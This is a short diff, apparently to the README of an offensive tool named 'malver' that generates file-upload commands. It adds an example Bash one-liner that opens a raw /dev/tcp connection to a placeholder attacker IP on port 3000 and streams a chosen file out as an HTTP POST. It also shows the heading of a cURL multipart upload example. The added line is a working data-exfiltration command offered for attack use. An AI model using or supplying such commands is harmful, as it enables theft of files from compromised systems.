@@ -86,6 +86,12 @@ malver -upload-commands -ip <ATTACKING_IP> -file <FILE_PATH>
 
 Example output:
 
+> Bash
+
+```bash
+exec 3<>/dev/tcp/<ATTACKING_IP>/3000; { printf "POST /up HTTP/1.1\r\nHost: <ATTACKING_IP>:3000\r\nContent-Type: application/octet-stream\r\nFilename: <FILE_PATH>\r\nContent-Length: $(wc -c < <FILE_PATH>)\r\n\r\n"; cat <FILE_PATH>; } >&3; cat <&3; exec 3>&-
+```
+
 > cURL (Multipart Upload)
 
 ```bash
